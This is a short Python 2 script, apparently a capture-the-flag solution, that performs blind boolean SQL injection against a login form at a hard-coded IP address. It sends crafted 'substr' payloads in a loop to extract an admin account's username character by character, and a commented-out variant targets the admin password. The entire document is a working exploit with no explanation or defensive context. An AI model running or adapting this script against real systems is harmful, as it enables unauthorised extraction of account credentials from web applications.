#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import os

def main(args):
	md5_hash = ""
	index = 1
	char = '1'
	while True:
		for char in "qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM!@#$%^&*()_+=-":
			#payload = '''admin' and substr((SELECT password from users where username="admin"),'''+str(index)+''',1)=\''''+char+'''\'--''' 
			payload = '''LordCommander' and substr((SELECT username from users where role="admin" limit 1 offset 1),'''+str(index)+''',1)=\''''+char+'''\'--''' 
			r = requests.post("http://163.172.176.29/WALL/index.php",data={"life":payload,"soul":""})
			if "Wrong identity" in r.text:
				#print "Found",char
				md5_hash+=char
				break
		os.system("clear")
		print "Hash extracting.. {:0.2f}% done.".format(index/32.0*100.0)
		print md5_hash
		index+=1
		if index==33:
			break
	print "There you go",md5_hash,len(md5_hash)
	return 0

if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
